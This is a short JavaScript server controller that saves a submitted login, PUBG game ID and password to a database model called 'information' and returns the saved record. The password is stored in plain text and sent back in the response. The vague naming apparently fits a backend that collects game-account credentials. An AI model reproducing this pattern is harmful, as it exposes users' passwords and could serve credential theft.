import informationModel from "../../models/information.js";

export const createInformation = async (req, res) => {
  const { login, pubgId, password } = req.body;

  try {
    const information = await informationModel.create({
      login,
      pubgId,
      password,
    });
    res.status(200).json(information);
  } catch (err) {
    res.status(500).json({ message: "Something went wrong" });
    console.log(err);
  }
};
